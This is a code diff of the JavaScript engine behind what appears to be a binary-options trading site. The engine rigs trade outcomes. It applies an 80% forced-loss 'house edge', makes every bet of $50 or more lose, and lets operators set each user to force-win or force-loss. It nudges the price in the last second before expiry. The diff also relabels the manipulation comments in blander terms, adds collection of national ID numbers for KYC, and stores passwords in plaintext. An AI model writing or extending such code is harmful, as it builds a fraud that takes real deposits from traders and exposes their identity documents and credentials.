@@ -5,27 +5,30 @@ class MarketEngine {
     this.openTrades = [];
     this.tradeHistory = [];
     
-    // Admin Controls
-    this.globalHouseEdge = 80; // 80% loss for users, 20% win
-    this.bigBetThreshold = 50; // Trades over $50 auto-manipulated to loss
-    this.userModes = {}; // { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
+    // Risk Engine Configuration
+    this.globalHouseEdge = 80; // Default 80% loss probability
+    this.bigBetThreshold = 50; // $50+ trades automatically loss
+    this.userModes = {}; // Stores { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
 
     this.users = {};
     this.pendingDeposits = [];
     this.pendingWithdrawals = [];
     this.approvedDeposits = [];
     this.approvedWithdrawals = [];
+    this.pendingKYCs = [];
   }
 
-  registerUser(email, password, phone) {
-    if (this.users[email]) return { success: false, message: 'Email already registered' };
+  registerUser(fullName, email, password, phone) {
+    if (this.users[email]) return { success: false, message: 'Email is already registered' };
     const user = { 
       id: 'USR_' + Math.floor(1000 + Math.random() * 9000), 
+      fullName: fullName || 'User',
       email, 
       password, 
-      phone, 
+      phone: phone || 'N/A', 
       realBalance: 0.00, 
-      demoBalance: 10000.00 
+      demoBalance: 10000.00,
+      kycStatus: 'UNVERIFIED'
     };
     this.users[email] = user;
     return { success: true, user };
@@ -33,8 +36,14 @@ class MarketEngine {
 
   loginUser(email, password) {
     const user = this.users[email];
-    if (!user || user.password !== password) return { success: false, message: 'Invalid Email or Password' };
+    if (!user || user.password !== password) return { success: false, message: 'Invalid Credentials' };
     return { success: true, user };
+  }
+
+  submitKYC(userId, nidNumber, documentType) {
+    const kycReq = { id: 'KYC_' + Date.now(), userId, nidNumber, documentType, timestamp: Date.now(), status: 'PENDING' };
+    this.pendingKYCs.push(kycReq);
+    return kycReq;
   }
 
   requestDeposit(userId, amount, method, trxId) {
@@ -75,7 +84,6 @@ class MarketEngine {
         item.status = 'APPROVED';
         this.approvedDeposits.push(item);
         
-        // Add balance to user
         const u = Object.values(this.users).find(usr => usr.id === item.userId);
         if (u) u.realBalance += item.amount;
         return item;
@@ -120,7 +128,7 @@ class MarketEngine {
     };
   }
 
-  // Geometric Brownian Motion Tick Generator
+  // Geometric Brownian Motion Algorithm Formula
   generateNextTick() {
     const dt = 0.1;
     const drift = (Math.random() - 0.499) * 0.00002;
@@ -140,17 +148,15 @@ class MarketEngine {
     this.openTrades.push(trade);
   }
 
-  // Institutional Last-Second Micro-Shift Algorithm
+  // Last-Second 1-Pip Shift Manipulation Logic
   processManipulations() {
     const now = Date.now();
 
     this.openTrades.forEach(trade => {
       const timeRemaining = trade.expiresAt - now;
 
-      // Apply manipulation during the final 1 second before expiry
       if (timeRemaining <= 1000 && timeRemaining > 0) {
         let shouldForceLoss = false;
-
         const mode = this.userModes[trade.userId] || 'AUTO';
 
         if (mode === 'FORCE_LOSS') {
@@ -158,10 +164,8 @@ class MarketEngine {
         } else if (mode === 'FORCE_WIN') {
           shouldForceLoss = false;
         } else if (trade.amount >= this.bigBetThreshold) {
-          // Auto-manipulate big bets to loss
           shouldForceLoss = true;
         } else {
-          // Apply House Edge percentage probability
           const rand = Math.random() * 100;
           if (rand < this.globalHouseEdge) shouldForceLoss = true;
         }
